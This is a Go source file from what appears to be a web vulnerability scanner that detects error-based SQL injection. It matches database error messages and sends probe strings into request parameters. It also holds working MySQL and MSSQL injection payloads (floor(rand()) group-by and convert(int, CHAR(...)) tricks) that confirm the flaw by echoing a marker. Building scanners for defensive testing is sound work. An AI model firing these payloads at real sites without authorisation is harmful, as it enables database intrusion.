package sql

import (
	"glint/pkg/layers"
	"glint/util"
	"regexp"

	"github.com/thoas/go-funk"
)

var plainTexts = []string{
	`Microsoft OLE DB Provider for ODBC Drivers`,
	`Error Executing Database Query`,
	`Microsoft OLE DB Provider for SQL Server`,
	`ODBC Microsoft Access Driver`,
	`ODBC SQL Server Driver`,
	`supplied argument is not a valid MySQL result`,
	`You have an error in your SQL syntax`,
	`Incorrect column name`,
	`Syntax error or access violation:`,
	`Invalid column name`,
	`Must declare the scalar variable`,
	`Unknown system variable`,
	`unrecognized token: `,
	`A Database Error Occurred`,
	`MySQL error`,
	`undefined alias:`,
	`Can\'t find record in`,
	`2147217900`,
	`Unknown table`,
	`Incorrect column specifier for column`,
	`Column count doesn\'t match value count at row`,
	`Unclosed quotation mark before the character string`,
	`Unclosed quotation mark`,
	`Call to a member function row_array() on a non-object in`,
	`Invalid SQL:`,
	`ERROR: parser: parse error at or near`,
	`): encountered SQLException [`,
	`Unexpected end of command in statement [`,
	`[ODBC Informix driver][Informix]`,
	`[Microsoft][ODBC Microsoft Access 97 Driver]`,
	`Incorrect syntax near `,
	`[SQL Server Driver][SQL Server]Line 1: Incorrect syntax near`,
	`SQL command not properly ended`,
	`unexpected end of SQL command`,
	`Supplied argument is not a valid PostgreSQL result`,
	`internal error [IBM][CLI Driver][DB2/6000]`,
	`PostgreSQL query failed`,
	`Supplied argument is not a valid PostgreSQL result`,
	`pg_fetch_row() expects parameter 1 to be resource, boolean given in`,
	`unterminated quoted string at or near`,
	`unterminated quoted identifier at or near`,
	`syntax error at end of input`,
	`Syntax error in string in query expression`,
	`Error: 221 Invalid formula`,
	`java.sql.SQLSyntaxErrorException`,
	`SQLite3::query(): Unable to prepare statement:`,
	`<title>Conversion failed when converting the varchar value \'A\' to data type int.</title>`,
	`SQLSTATE=42603`,
	`org.hibernate.exception.SQLGrammarException:`,
	`org.hibernate.QueryException`,
	`System.Data.SqlClient.SqlException:`,
	`SqlException`,
	`SQLite3::SQLException:`,
	`Syntax error or access violation:`,
	`Unclosed quotation mark after the character string`,
	`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near`,
	`PDOStatement::execute(): SQLSTATE[42601]: Syntax error:`,
	`<b>SQL error: </b> no such column`,
	`org.springframework.jdbc.BadSqlGrammarException:`,
	`java.sql.BatchUpdateException:`,
}

var regexTexts = []string{
	`(Incorrect\ssyntax\snear\s'[^']*')`,
	`(Syntax error: Missing operand after '[^']*' operator)`,
	`Syntax error near\s.*?\sin the full-text search condition\s`,
	`column "\w{5}" does not exist`,
	`near\s[^:]+?:\ssyntax\serror`,
	`(pg_query\(\)[:]*\squery\sfailed:\serror:\s)`,
	`('[^']*'\sis\snull\sor\snot\san\sobject)`,
	`(ORA-\d{4,5}:\s)`,
	`(Microsoft\sJET\sDatabase\sEngine\s\([^\)]*\)<br>Syntax\serror(.*)\sin\squery\sexpression\s'.*\.<br><b>.*,\sline\s\d+<\/b><br>)`,
	`(<h2>\s<i>Syntax\serror\s(\([^\)]*\))?(in\sstring)?\sin\squery\sexpression\s'[^\.]*\.<\/i>\s<\/h2><\/span>)`,
	`(<font\sface=\"Arial\"\ssize=2>Syntax\serror\s(.*)?in\squery\sexpression\s'(.*)\.<\/font>)`,
	`(<b>Warning<\/b>:\s\spg_exec\(\)\s\[\<a\shref='function.pg\-exec\'\>function\.pg-exec\<\/a>\]\:\sQuery failed:\sERROR:\s\ssyntax error at or near \&quot\;\\\&quot; at character \d+ in\s<b>.*<\/b>)`,
	`(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\s\([^)]*?\)\sin\squery\sexpression\s.*)`,
	`(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\sin\sstring\sin\squery\sexpression\s)`,
	`(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')`,
	`(<font style="COLOR: black; FONT: 8pt\/11pt verdana">\s+(\[Macromedia\]\[SQLServer\sJDBC\sDriver\]\[SQLServer\]|Syntax\serror\sin\sstring\sin\squery\sexpression\s))`,
	`(Unclosed\squotation\smark\safter\sthe\scharacter\sstring\s'[^']*')`,
	`((<b>)?Warning(<\/b>)?:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\/b>)? on line (<b>)?\d+(<\/b>)?)`,
	`((<b>)?Warning(<\/b>)?:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\) expects parameter \d+ to be resource, \w+ given in (<b>)?.*?(<\/b>)? on line (<b>)?\d+(<\/b>)?)`,
	`(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \d)`,
	`(Query\sfailed\:\sERROR\:\scolumn\s"[^"]*"\sdoes\snot\sexist\sLINE\s\d)`,
	`(Query\sfailed\:\sERROR\:\s+unterminated quoted string at or near)`,
	`(The string constant beginning with .*? does not have an ending string delimiter\.)`,
	`(Unknown column '[^']+' in '\w+ clause')`,
}

var FalsePositivesPlainArray = []string{
	"Connection Timeout",
	"(0x80131904)",
	"org.apache.commons.dbcp.SQLNestedException: Cannot get a connection, pool error Timeout waiting for idle object",
}

type ClassSQLErrorMessages struct {
	TargetUrl                string
	plainArray               []string
	regexArray               []string
	FalsePositivesPlainArray []string
	LastJob                  *layers.LastJob
	variations               *util.PostData
	trueFeatures             layers.MFeatures
	// layer                    *layers.Plreq
}

func (errsql *ClassSQLErrorMessages) IsFalsePositive(text string) bool {
	// plain texts
	// for i := 0; i < errsql.FalsePositivesPlainArray; i++ {

	// }
	// for (var i = 0; i < this.FalsePositivesPlainArray.length; i++) {
	// 	if (text.indexOf(this.FalsePositivesPlainArray[i]) != -1) return true;
	// }
	for _, v := range errsql.FalsePositivesPlainArray {
		if funk.Contains(text, v) {
			return true
		}
	}

	for _, v := range errsql.FalsePositivesPlainArray {
		r, _ := regexp.Compile(v)
		C := r.FindAllStringSubmatch(text, -1)
		if len(C) > 0 {
			return true
		}
	}

	return false
}

func (errsql *ClassSQLErrorMessages) searchOnText(text string) string {
	var result string
	for _, v := range plainTexts {
		if funk.Contains(text, v) {
			return v
		}
	}
	for _, v := range regexTexts {
		r, _ := regexp.Compile(v)
		C := r.FindStringSubmatch(text)
		if len(C) > 0 {
			return C[0]
		}
	}
	return result
}

func encodeStringAsChar(str string, separator string) string {
	var out = ""
	for _, v := range []rune(str) {
		out = out + `CHAR(` + string(v) + `)` + separator
	}
	if out != "" {
		// remove the last +
		out = out[:len(out)-1]
	}
	return out
}

func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, confirmData []string) bool {
	feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, value)
	errsql.trueFeatures = feature
	if err != nil {
		return false
	}
	matchedText := errsql.searchOnText(errsql.LastJob.Features.Response.String())
	if matchedText != "" {
		for _, data := range confirmData {
			markerPlain := util.RandStr(8)
			markerEncodedMSSQL := encodeStringAsChar(markerPlain, `+`)
			markerEncodedMYSQL := encodeStringAsChar(markerPlain, `,`)
			// msyql variant 1
			confirmValue := data +
				`and(select 1 from(select count(*),concat((select concat(` +
				markerEncodedMYSQL +
				`) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and` +
				data
			body_Feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
			if err != nil {
				return false
			}
			if funk.Contains(body_Feature.Response.String(), markerPlain) {
				return true
			}

			// msyql variant 2
			confirmValue = data +
				`(select 1 and row(1,1)>(select count(*),concat(concat(` +
				markerEncodedMYSQL +
				`),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))` +
				data
			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
			if err != nil {
				return false
			}
			if funk.Contains(body_Feature.Response.String(), markerPlain) {
				return true
			}
			// mssql variant 1
			if data != "" {
				confirmValue = data + `+(select convert(int,` + markerEncodedMSSQL + `) FROM syscolumns)+` + data
			} else {
				confirmValue = data + `(select convert(int,` + markerEncodedMSSQL + `) FROM syscolumns)` + data
			}
			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
			if err != nil {
				return false
			}
			if funk.Contains(body_Feature.Response.String(), markerPlain) {
				return true
			}
			// mssql variant 2
			if data != "" {
				confirmValue = data + `+convert(int,` + markerEncodedMSSQL + `)+` + data
			} else {
				confirmValue = data + `convert(int,` + markerEncodedMSSQL + `)` + data
			}
			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
			if err != nil {
				return false
			}
			if funk.Contains(body_Feature.Response.String(), markerPlain) {
				return true
			}
		}
		return false
	}
	return false
}

func (errsql *ClassSQLErrorMessages) testForError() bool {
	if errsql.LastJob != nil {
		if errsql.searchOnText(errsql.LastJob.Features.Response.String()) == "" {
			return false
		}
	}
	return true
}

func (errsql *ClassSQLErrorMessages) startTesting() bool {
	if errsql.variations != nil {
		for _, p := range errsql.variations.Params {
			if errsql.testForError() {
				return true
			}
			if errsql.TestInjection(p.Index, "1'\"", []string{"", "'", `"`}) {
				return true
			}
			if errsql.TestInjection(p.Index, "1\x00\xc0\xa7\xc0\xa2%2527%2522", []string{"", "'", `"`}) {
				return true
			}
			if errsql.TestInjection(p.Index, "@@"+util.RandStr(8), []string{"", "'", `"`}) {
				return true
			}
		}
	}

	return false
}
